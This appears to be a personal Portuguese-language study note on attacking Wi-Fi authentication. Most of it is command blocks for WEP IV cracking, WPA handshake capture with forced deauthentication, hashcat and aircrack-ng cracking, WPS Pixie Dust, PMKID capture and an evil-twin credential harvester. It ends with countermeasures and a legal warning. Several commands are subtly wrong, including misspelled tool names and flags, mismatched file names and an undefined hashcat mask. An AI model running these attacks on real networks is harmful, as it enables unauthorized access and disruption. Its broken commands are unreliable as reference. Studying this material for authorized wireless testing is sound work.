2025-09-02 23:26

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Redes de Computadores]] | [[Redes]] | [[Wi-Fi]]

----
# Introdução

A quebra de autenticação em redes Wi-Fi envolve explorar vulnerabilidades nos protocolos de segurança para obter acesso não autorizado.

---
# Fundamentos dos Protocolos de Autenticação

## 1. Evolução dos Protocolos

- **WEP *(Wired Equivalente Privacy)*:** Protocolo original com vulnerabilidades críticas.
- **WPA *(Wi-Fi Protected Access)*:** Melhoria temporária do WEP.
- **WPA2:** Padrão atual com segurança robusta (quando bem configurado)
- **WPA3:** Novo padrão com autenticação *Simultaneous Authentication of Equals* (SAE).

## 2. Componentes Chave

- **PSK *(Pre-Shared Key)*:** Chave compartilhada para redes pessoais.
- **EAP *(Extensible Authentication)*:** Framework para redes enterprise.
- ***4-Way Handshake*:** Processo de autenticação no WPA/WPA2.
- **PMK *(Pairwise Master Key)*:** Chave mestra derivada da PSK.

---
# Tipos de Ataques de Autenticação

## 1. Ataques a WEP

**Vulnerabilidade:** Uso de IVs *(Initialization Vectors)* fracos e reutilizados.

**Técnicas Principais:**

- **Ataque FMS *(Fluhrer, Mantin, Shamir)*:** Explora IVs fracos.
- **Ataque KoreK:** Melhoria do ataque FMS.
- **Ataque PTW *(Pyshkin, Tews, Weinmann)*:** Ataque moderno mais eficiente.

**Ferramentas:**

```bash
# Coletar IVs com airodump-ng
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Injetar tráfego para gerar mais IVs
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Quebrar chave WEP com aircrack-nh
sudo aircrack-ng web_capture-01.cap
```

## 2. Ataques a WPA/WPA2-PSK

**Vulnerabilidade:** Dependência da força da passphrase.

**Técnicas Principais:**

- **Ataque de Dicionário:** Teste de palavras comuns.
- **Ataque de Força Bruta:** Tentativa exaustiva de combinações.
- **Ataque *Rainbow Table*:** Uso de tabelas pré-computadas.
- **Ataque PMKID:** Captura do PMKID sem handshake.

**Ferramentas:**

```bash
# Capturar handshake com airodump-ng
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Forçar handshake com deautenticação
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Quebrar handshake com aircrack-ng
sudo aircrack-ng -w /usr/share/wordlist/rockyou.txt wpa_capture-01.cap
```

## 3. Ataques a WPS *(Wi-Fi Protected Setup)*

**Vulnerabilidade:** PIN de 8 dígitos com checksum fracos.

**Técnicas Principais:**

- **Ataque *Pixie Dust*:** Explora  falhas na randomização.
- **Ataque de Força Bruta ao PIN:** Teste sistemático de PINs.
- **Ataque Online:** Tentativas de PIN contra o AP.

**Ferramentas:**

```bash
# Verificar se WPS está ativo com wash
sudo wash -i wlan0mon

# Ataque com Reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# Ataque com Bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3
```

## 4. Ataques a WPA3

**Vulnerabilidade:** Implementações recentes com possíveis falhas.

**Técnicas Principais:**

- **Ataque Dragonblood:** Explora falhas no handshake SAE.
- **Ataque de Downgrade:** Força retorno para WPA2.
- **Side-channel attacks:** Análise de timing e consumo de energia.

**Ferramentas:**

```bash
git clone https://github.com/vanhoefm/dragonblood.git
cd dragonblood
python3 dragonblood_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF
```

## 5. Ataques a Redes Enterprise (WPA-Enterprise)

**Vulnerabilidade:** Configuração inadequada de servidores RADIUS.

**Técnicas Principais:**

- **EAP-MD5 Attacks:** Explora falta de autenticação mútua.
- **Credential Harvesting:** Captura de credenciais com Evil Twin.
- **Credentials Manipulation:** Ataques a infraestrutura PKI.

**Ferramentas:**

```bash
# Configurar Evil Twin para captura de credenciais
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Analisar certificados capturados
openssl x509 -in captured.crt -text -noout
```

---
# Ferramentas Detalhadas

## 1. `aircrack-ng`

**Componentes Principais:**

- `airmon-ng`: Configuração do modo monitor.
- `airodump-ng`: Captura de pacotes.
- `aireplay-ng:` Injeção de pacotes.
- `aircrack-ng`: Quebra de chaves.

**Exemplo completo WPA2:**

```bash
# Passo 1: Modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Passo 2: Capturar handshake
sudo airdump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Passo 3: Forçar deautenticação
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Passo 4: Quebrar chave:
sudo aircrack-ng -w wordlist.txt capture-01.cap
```

## 2. `hashcat`

**Vantagem:** Aceleração por GPU para quebra  rápida

```bash
# Converter captura para formato hashcat
sudo aircrack-ng -J output capture-01.cap

# Quebra com hashcat
hashcat -m 22000 output.hc22000 wordlist.txt

# Ataque de força bruta com máscara
hashcat -m 22000 output.hc22000 -a 3 ?1?1?1?1?1?1?1?1
```

## 3. `wifite`

**Automação:** Script automatizado para múltiplos ataques.

```bash
# Ataque automático a todas as redes
sudo wifite --all --kill

# Ataque específico a WPS
sudo wifite --wps --wps-tipe 300

# Ataque PMKID
sudo wifite --pmki --no-wps
```

## 4. `hcxdumptool` & `hcxtools`

**Especializado:** Para ataques PMKID e captura avançada.

```bash
# Capturar tráfego para PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Extrair hashes
hcxpcaptool -z hashes.txt capture.pcapng

# Converter para formato hashcat
hcxpcaptool -E essidlist -I identitylist -U usernamelist -Z outputo.hc2000 capture.pcapng
```

---
# Técnicas Avançadas

## 1. Ataque PMKID

**Vantagem:** Não requer handshake completo.

```bash
# Capturar PMKID com hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid_capture --enable_status --filterlist=ap_list.txt

# Processar captura
hcxpcaptool -z pmkid_hashes pmkid_capture

# Quebrar com haschat
hashcat -m 16800 pmkid_hashes wordlist.txt
```

## 2. Ataque Pixie Dust ao WPS

**Eficiência:** Quebra instantânea em APs vulneráveis.

```bash
# Com Reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K -N -d 0 -t 0

# Com Bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3 -d -F -B
```

## 3. Ataques com Dicionários Otimizados

**Otimização:** Uso de regras e mutações.

```bash
# Gerar wordlist personalizada
crunch 8 12 -t @@@%%%%%% -o wordlist.txt

# Aplicar regras no hashcat 
hashcat -m 22000 capture.hc22000 -r rules/best64.rule worldlist.txt
```

---
# Contramedidas e Proteções

## 1. Para Redes Domésticas

- **Use WPA3** quando disponível.
- **Desative WPS** nos roteadores.
- **Use passphrases complexas** (mínimo 12 caracteres).
- **Altere a senha padrão** do administrador.

## 2. Para Redes Enterprise

- **Implemente WPA3-Enterprise**.
- **Use certificados digitais**.
- **Configure radius seguros**.
- **Monitore tentativas de autenticação**.

## 3. Detecção de Ataques

- **Monitorar deautenticações excessivas.**
- **Detectar múltiplas tentativas de PIN WPS.**
- **Alertas para falhas de autenticação.**
- **Análise de tráfego suspeito.**

---
# Considerações Legais e Éticas.

>[!warning] Legalidade:
>- **Autorização por escrito** é obrigatória.
>- **Teste apenas em redes próprias** ou com permissão.
>- **Documente todas as atividades**.
>- **Respeite leis locais** de privacidade.

>[!info] Ética Profissional:
>- **Reporte vulnerabilidades** de forma responsável.
>- **Não explore falhas** sem permissão.
>- **Proteja dados capturados** durante testes.
>- **Eduque clientes** sobre medidas de segurança.

---
# Fluxograma de Ataques

```text
Modo Monitor → Escaneamento → Identificação Alvo
      ↓              ↓              ↓
Captura IVs (WEP)  Captura Handshake (WPA)  Captura PMKID
      ↓              ↓              ↓
Injeção ARP       Deautenticação   Processamento
      ↓              ↓              ↓
Quebra WEP        Quebra WPA       Quebra PMKID
      ↓              ↓              ↓
Acesso Concedido → Pós-Exploração → Relatório
```

---
# Recursos e Referências

## 1. Wordlists Recomendadas

- **Rockyou.txt:** Wordlist comum com vazamentos reais.
- **Crunch:** Gerador de wordlists personalizadas.
- **CeWL:** Criar wordlists a partir de websites.
- **Mentalist:** Geração de wordlists com regras.

## 2. Hardware Recomendado

- **Adaptadores:** Alfa AWUS03ACH, Panda PAU09.
- **Antenas:** Antenas direcionais de alto ganho.
- **GPUs:** Placas NVIDIA para aceleração `hashcat`.

## 3. Treinamento

- **CWSP:** *Certified Wireless Security Professional*.
- **OSWP:** *Offensive Security Wireless Professional*.
- **Treinamentos de pentest wireless.**



